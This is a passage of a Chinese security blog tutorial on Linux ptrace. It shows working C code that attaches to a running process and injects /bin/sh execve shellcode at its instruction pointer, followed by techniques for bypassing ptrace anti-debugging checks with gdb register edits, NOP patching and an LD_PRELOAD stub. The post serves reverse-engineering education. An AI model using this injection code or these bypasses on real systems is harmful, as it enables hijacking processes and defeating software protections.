        putdata(traced_process, regs.rip, backup, 3); /*将backup原指令机器码恢复到原rip指向的地址中*/
        ptrace(PTRACE_SETREGS, traced_process, NULL, &regs); /* 让rip指向的内存地址恢复到原本指向的地址，让目标进程继续执行，恢复rip指针 */
        ptrace(PTRACE_DETACH, traced_process, NULL, NULL);/* 结束跟踪*/
        return 0;
    
    }
    

源码编译如果使用32位编译，相应rip改成eip，64位编译则不需要改。

测试用例，用个简单的c语言程序（32位编译）:

    
    
    #include<unistd.h>
    #include <stdio.h>
    int main()
    {    
        printf("pid=%d\n",getpid());
        for(int num=0;num<20;num++)
        {
        printf("num = %d\n",num);
        sleep(2);
        }
        return 0;
    }
    

当我执行hacker程序的时候，hellword程序将被暂停（记得sudo执行hacker）

![](https://p2.ssl.qhimg.com/t012c2aa3a4cc2a22d3.png)

![](https://p1.ssl.qhimg.com/t01de69db962c7fc630.png)

这里相当于劫持rip指针，而rip指针指向的地址将是即将执行的指令的地址。

稍微变动一下，直接插入一小段shellcode代码。

我们得明白有这几种情况：

  1. 我们可以插入到当前要执行的指令之后，这是最直接的方式但是会破坏原有的目标进程，会导致原来的目标进程的后续功能受到破坏。/ _下面得示例就用的这种方式_ /
  2. 我们可以尝试注入代码到main函数地址处，但是有一定的几率是某些初始化的操作是在程序执行之前，因此我们首先需要让程序的正常工作。
  3. 另外的选择是使用ELF注入技巧，注入我们的代码，例如在内存中寻找空隙。
  4. 最后，我们可以在栈中注入代码，同一般的栈溢出，这是一种安全的方式可以避免破坏原有程序的方式。

    
    
    #include <sys/ptrace.h>
    #include <sys/types.h>
    #include <sys/wait.h>
    #include <unistd.h>
    #include <sys/user.h>
    #include <asm/ptrace-abi.h>
    #include <string.h>
    #include <stdio.h>
    #include <stdlib.h>
    
    const int long_size = sizeof(long);
    /*通过PTRACE_POKEDATA向内存写内容*/
    void putdata(pid_t child, long addr, char *str, int len)
    {   
        char *code;
        int i, j;
        union u{
                long val;
                char chars[long_size];
         }data;
        i = 0;
        j = len / long_size;
        code = str;
        while(i < j) {
            memcpy(data.chars, code, long_size);
            ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);
            ++i;
            code += long_size;
        }
        j = len % long_size;
        if(j != 0) {
            memcpy(data.chars, code, j);
            ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);
        }
    }
    int main(int argc, char *argv[])
    {   pid_t traced_process;
        struct user_regs_struct regs;
        long ins;
        int len = 25;
        char insertcode[] = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";//shellcode
        traced_process = atoi(argv[1]);
        ptrace(PTRACE_ATTACH, traced_process,NULL, NULL);//跟踪进程
        wait(NULL);
        ptrace(PTRACE_GETREGS, traced_process,NULL, &regs);//当前所有寄存器的值
        putdata(traced_process,regs.eip,insertcode, len);//写入shellcode
        regs.eip +=2 ;//修改rip的值，指向我们注入的shellcode
        ptrace(PTRACE_SETREGS, traced_process, NULL, &regs);//把修改后的寄存器的值写入被跟踪的进程
        ptrace(PTRACE_CONT, traced_process,NULL, NULL);//被跟踪的进程继续执行
        printf("This process is attacked by 0xAXSDD! Press <enter> to continue!");
        ptrace(PTRACE_DETACH, traced_process,NULL, NULL);//结束跟踪
        return 0;
    }
    

这里没有恢复到原先执行状态，因为我们直接getshell，不需要再返回到原程序中了。

运行效果截图

![](https://p1.ssl.qhimg.com/t019501524681f4047e.png)

![](https://p0.ssl.qhimg.com/t019ee96f4e5fe24376.png)

## 绕过简单的ptrace

上面谈论到ptrace在隐藏的过程中的攻防博弈，并没有说如何绕过ptrace，接下来我们讲如何绕过ptrace一些手段。

###  1.通过gdb修改eax（64位rax）中的返回值来绕过ptrace

理论依据：像这样的代码

    
    
    #include <sys/ptrace.h>
    #include <stdio.h>
    int main()
    {
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) ==-1 )//这里就直接先执行了ptrace(PTRACE_TRACEME, 0, 0, 0)，表示此程序已经被追踪
        {
            printf("don't trace me！\n");
            return 1;
        }
        printf("no one trace me！\n");
        return 0;
    }
    

我这里编译为64位

通过函数的返回值是否为-1来判断，是否正在被调试，如果我们直接修改ptrace的返回值，就可以绕过判断，ptrace函数执行之后的返回值将会保存在rax寄存器中，所以我们只需要在ptrace函数那里下断点，然后等ptrace函数结束后，利用set
$rax=0指令来设置rax的值，那么就会绕过判断，就能继续调试程序。

演示：

直接sudo gdb hellword3进行gdb调试

然后输入：

    
    
    catch syscall ptrace
    

然后c继续执行，第一次暂停是发生在刚开始调用ptrace，然后继续n，n，直到返回到主函数，比较rax的值时候，注意，我们必须得在ptrace执行完成之后，返回到主函数时才更改rax的值

![](https://p2.ssl.qhimg.com/t011cbd8262bda2bbd8.png)

可以看到正常ptrace运行完之后，rax中的值为-1（32位为eax）

输入命令：

    
    
    set $rax=0
    

然后继续运行，成功绕过ptrace反调试

![](https://p4.ssl.qhimg.com/t015d9815e14849ba24.png)

###  2.直接通过Binary Ninja查找ptrace调用然后nop替换

直接通过搜索文本，然后找到调用ptrace的地方

![](https://p4.ssl.qhimg.com/t01fb3ab142dac736c3.png)

直接选中这一行，然后右键，patch然后直接换成nop，就欧克了，然后另存！

![](https://p1.ssl.qhimg.com/t010a27140d533cab6c.png)

###  3.使用LD_PRELOAD来劫持ptrace函数的调用

这里只针对那些动态链接共享库的程序，局限性很大，通过创键本地自定义的伪造库，使用LD_PRELOAD来劫持ptrace调用库为我们自定义的伪造库，这样就起到了狸猫换太子的效果！

用的命令，共享库文件代码

    
    
    long ptrace(int request, int pid, int addr, int data)
    {
         return 0;
    }
    

编译成共享库文件，然后LD_PRELOAD劫持

    
    
    gcc ptrace.c -o ptrace.so -fPIC -shared -ldl -D_GNU_SOURCE
    export LD_PRELOAD="/home/hacker/Reverse_debugging/ptrace/ptracE.SO"
    

![](https://p2.ssl.qhimg.com/t01b00214089041cb61.png)

其他绕过反调试手法具体程序具体分析，以一变应万变！

完结完结！！！撒花撒花

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **0XAXSDD** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/231078](/post/id/231078)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [ptrace](/tag/ptrace)

 **+1** __13赞

 __收藏

![](https://thirdqq.qlogo.cn/g?b=oidb&k=UJHB1tBSSeELjaKwsDFL7w&s=40&t=1574384497)
0XAXSDD

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

